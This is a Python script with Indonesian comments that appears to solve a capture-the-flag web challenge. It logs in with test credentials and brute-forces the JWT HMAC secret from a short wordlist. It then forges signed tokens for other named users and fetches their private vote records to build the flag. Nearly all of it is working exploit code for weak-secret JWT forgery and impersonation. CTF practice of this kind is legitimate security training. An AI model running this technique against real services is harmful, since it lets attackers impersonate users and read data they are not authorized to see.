import requests
import json
import base64
import hmac
import hashlib
import time

BASE_URL = "http://chals2.apoorvctf.xyz"
# List tebakan Secret Key dari hint HTML
SECRETS = ["STUPIDO", "stupido", "Stupido", "BRO", "bro", "test", "secret"]

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def base64url_decode(data):
    padding = '=' * (4 - (len(data) % 4))
    return base64.urlsafe_b64decode(data + padding)

def sign_jwt(header_b64, payload_b64, secret):
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return base64url_encode(sig)

def get_votes_for(user, valid_secret, orig_payload):
    print(f"\n[*] Memalsukan token untuk user: {user}...")
    
    payload = orig_payload.copy()
    payload["sub"] = user
    payload["jti"] = f"{user}:{payload['iat']}"
    
    # Bikin ulang token dengan secret yang ketemu
    new_header_b64 = base64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')).encode())
    new_payload_b64 = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    new_sig = sign_jwt(new_header_b64, new_payload_b64, valid_secret)
    
    forged_token = f"{new_header_b64}.{new_payload_b64}.{new_sig}"
    
    headers = {
        "Authorization": f"Bearer {forged_token}",
        "User-Agent": "Mozilla/5.0"
    }
    
    # Intip vote-nya
    r_votes = requests.get(f"{BASE_URL}/my_votes", headers=headers)
    
    if r_votes.status_code == 200:
        votes = r_votes.json()
        targets = [v['target'] for v in votes]
        
        if targets:
            print(f"[+] Berhasil meretas riwayat vote {user}!")
            # Gabungin huruf pertama dari setiap orang yang dia vote
            flag = "".join([t[0] for t in targets])
            print(f"\n[!!!] FLAG DITEMUKAN: apoorvctf{{{flag}}}")
        else:
            print(f"[-] {user} tidak mem-vote siapa pun.")
    else:
        print(f"[-] Gagal. Status: {r_votes.status_code}")

def main():
    print("[*] Login sebagai 'test' buat ngambil sampel Token...")
    r = requests.post(f"{BASE_URL}/login", json={"username": "test", "password": "test"})
    token = r.json().get("access_token")
    
    parts = token.split('.')
    header_b64, payload_b64, orig_sig = parts[0], parts[1], parts[2]
    
    print("[*] Mencoba melakukan bruteforce HMAC-SHA256 Secret Offline...")
    valid_secret = None
    for secret in SECRETS:
        if sign_jwt(header_b64, payload_b64, secret) == orig_sig:
            valid_secret = secret
            print(f"[+] BINGO! Secret Key Server adalah: '{secret}'")
            break
            
    if not valid_secret:
        print("[-] Gagal menemukan Secret. Perlu wordlist yang lebih banyak.")
        return
        
    orig_payload = json.loads(base64url_decode(payload_b64).decode())
    
    # Eksekusi Target V (Victor)
    get_votes_for("victor", valid_secret, orig_payload)
    
    # Opsional: kita cek juga si user aneh kalau victor bukan Target V
    time.sleep(1) # Biar ga kena drop server lagi
    get_votes_for("cosplayfanwhatdoilove", valid_secret, orig_payload)

if __name__ == "__main__":
    main()
